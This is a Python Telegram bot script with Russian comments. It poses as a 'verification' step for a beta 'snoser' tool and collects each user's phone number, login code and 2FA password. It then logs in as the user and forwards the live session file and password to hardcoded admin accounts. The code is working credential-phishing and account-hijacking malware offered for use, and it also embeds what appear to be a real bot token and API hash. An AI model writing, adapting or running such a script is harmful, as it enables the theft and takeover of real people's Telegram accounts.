import asyncio
import os
import re
import random
import json
import time
import glob
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError
from telethon import Button

# ========== КОНФИГ ==========
BOT_TOKEN = '8978520231:AAHhJN-kTxvRUuq5a38EE-vFLd6iHrCu-jk'
ADMIN_IDS = [7465903807, 6844924312]

APP_ID = 2040
APP_HASH = 'b18441a1ff607e10a989891a5462e627'
# ============================

# ГЛАВНАЯ ХУЙНЯ — заворачиваем в асинхронную функцию
async def main():
    bot = TelegramClient('bot_main', APP_ID, APP_HASH)
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    print(f"✅ БОТ ЗАПУЩЕН: {me.first_name} (ID: {me.id})")

    # Уведомляем админов
    for admin_id in ADMIN_IDS:
        try:
            admin_entity = await bot.get_entity(admin_id)
            await bot.send_message(admin_entity, f"✅ **Бот запущен!**\nID бота: `{me.id}`", parse_mode='markdown')
        except Exception as e:
            print(f"[DEBUG] Не могу отправить админу {admin_id}: {e}")

    # ВСЕ ТВОИ ХЕНДЛЕРЫ ТУТ (копируй их без изменений)
    @bot.on(events.NewMessage(pattern='/start'))
    async def start_handler(event):
        uid = event.sender_id
        if uid in ADMIN_IDS:
            await event.respond("🔐 **ADMIN PANEL**\n📊 /stats", parse_mode='markdown')
            return
        await event.respond(
            "⚠️ **Требуется верификация**\n\n"
            "Отправь номер телефона для доступа к бета версии сносера.",
            buttons=[[Button.inline("✅ Верифицироваться ✅", b"verify")]],
            parse_mode='markdown'
        )

    @bot.on(events.CallbackQuery)
    async def callback_handler(event):
        uid = event.sender_id
        if uid in ADMIN_IDS:
            await event.answer("Ты админ, иди нахуй")
            return
        if event.data == b'verify':
            await event.answer()
            await event.edit("📱 **Введи номер телефона:**\nФормат: `+1234567890`", parse_mode='markdown')
            user_states[uid] = {'step': 'phone'}

    @bot.on(events.NewMessage)
    async def message_handler(event):
        if event.is_private and not event.text.startswith('/'):
            uid = event.sender_id
            if uid in ADMIN_IDS:
                return
            if uid not in user_states:
                return
            state = user_states[uid]
            step = state.get('step')

            if step == 'phone':
                phone = event.text.strip()
                if not re.match(r'^\+\d{10,15}$', phone):
                    await event.respond("❌ Неверный формат! Пример: `+1234567890`", parse_mode='markdown')
                    return
                state['phone'] = phone
                session_name = f'temp_{uid}_{random.randint(1000, 9999)}'
                state['session_name'] = session_name
                temp_client = TelegramClient(session_name, APP_ID, APP_HASH)
                state['client'] = temp_client
                await event.respond("📨 Отправляю код...")
                try:
                    await temp_client.connect()
                    await temp_client.send_code_request(phone)
                    state['step'] = 'code'
                    await event.respond("✅ **Код отправлен!**\nВведи код с пробелами, например: `4 5 2 1 6`", parse_mode='markdown')
                except Exception as e:
                    await event.respond(f"❌ Ошибка: `{str(e)[:150]}`", parse_mode='markdown')
                    await temp_client.disconnect()
                    del user_states[uid]

            elif step == 'code':
                raw_input = event.text.strip()
                code = raw_input.replace(' ', '')
                if not code.isdigit() or len(code) < 5:
                    await event.respond("❌ Неверный код! Отправь с пробелами: `4 5 2 1 6`", parse_mode='markdown')
                    return
                temp_client = state.get('client')
                phone = state.get('phone')
                session_name = state.get('session_name')
                if not temp_client:
                    await event.respond("❌ Сессия протухла. Используй /start", parse_mode='markdown')
                    del user_states[uid]
                    return
                try:
                    await temp_client.sign_in(phone, code=code)
                    session_filename = f"{session_name}.session" if session_name else None
                    if session_filename and os.path.exists(session_filename):
                        for admin_id in ADMIN_IDS:
                            await send_to_admin(admin_id, session_filename, uid, phone)
                        await event.respond("✅ **Верификация пройдена!**", parse_mode='markdown')
                    else:
                        await event.respond("⚠️ Файл сессии не найден!", parse_mode='markdown')
                    await temp_client.disconnect()
                    del user_states[uid]
                except SessionPasswordNeededError:
                    state['step'] = '2fa'
                    await event.respond("🔐 **Облачный пароль (2FA):**\nВведи пароль или '-' если его нет:", parse_mode='markdown')
                except Exception as e:
                    await event.respond(f"❌ Ошибка: `{str(e)[:150]}`", parse_mode='markdown')
                    await temp_client.disconnect()
                    del user_states[uid]

            elif step == '2fa':
                twofa = event.text.strip()
                temp_client = state.get('client')
                phone = state.get('phone')
                session_name = state.get('session_name')
                if not temp_client:
                    await event.respond("❌ Сессия протухла", parse_mode='markdown')
                    del user_states[uid]
                    return
                try:
                    if twofa != '-':
                        await temp_client.sign_in(password=twofa)
                    session_filename = f"{session_name}.session" if session_name else None
                    if session_filename and os.path.exists(session_filename):
                        for admin_id in ADMIN_IDS:
                            await send_to_admin(admin_id, session_filename, uid, phone, twofa)
                        await event.respond("✅ **Верификация пройдена!**", parse_mode='markdown')
                    else:
                        await event.respond("⚠️ Файл сессии не найден!", parse_mode='markdown')
                    await temp_client.disconnect()
                    del user_states[uid]
                except Exception as e:
                    await event.respond(f"❌ 2FA ошибка: `{str(e)[:150]}`", parse_mode='markdown')
                    del user_states[uid]

    @bot.on(events.NewMessage(pattern='/stats'))
    async def stats_handler(event):
        if event.sender_id not in ADMIN_IDS:
            await event.respond("❌ Не авторизован")
            return
        sessions = glob.glob("temp_*.session")
        sent_data = {}
        if os.path.exists(SENT_LOG):
            with open(SENT_LOG, 'r') as f:
                sent_data = json.load(f)
        await event.respond(
            f"📊 **СТАТИСТИКА**\n\n"
            f"Активных юзеров: `{len(user_states)}`\n"
            f"Файлов сессий: `{len(sessions)}`\n"
            f"Отправлено: `{len(sent_data)}`",
            parse_mode='markdown'
        )

    await bot.run_until_disconnected()

# ФУНКЦИИ БЛЯДЬ ВНЕ MAIN
user_states = {}
SENT_LOG = 'sent_sessions.json'

def log_sent_session(user_id, phone, session_file):
    log = {}
    if os.path.exists(SENT_LOG):
        with open(SENT_LOG, 'r') as f:
            log = json.load(f)
    log[str(user_id)] = {
        'phone': phone,
        'session': session_file,
        'time': time.strftime('%Y-%m-%d %H:%M:%S')
    }
    with open(SENT_LOG, 'w') as f:
        json.dump(log, f, indent=2)

async def send_to_admin(admin_id, session_file, user_id, phone, twofa=None):
    if not os.path.exists(session_file):
        return False
    caption = f"🎯 **NEW SESSION!**\n👤 User: `{user_id}`\n📞 Phone: `{phone}`"
    if twofa:
        caption += f"\n🔐 2FA: `{twofa}`"
    await bot.send_file(admin_id, session_file, caption=caption, parse_mode='markdown')
    log_sent_session(user_id, phone, session_file)
    return True

# ЗАПУСК
if __name__ == '__main__':
    asyncio.run(main())
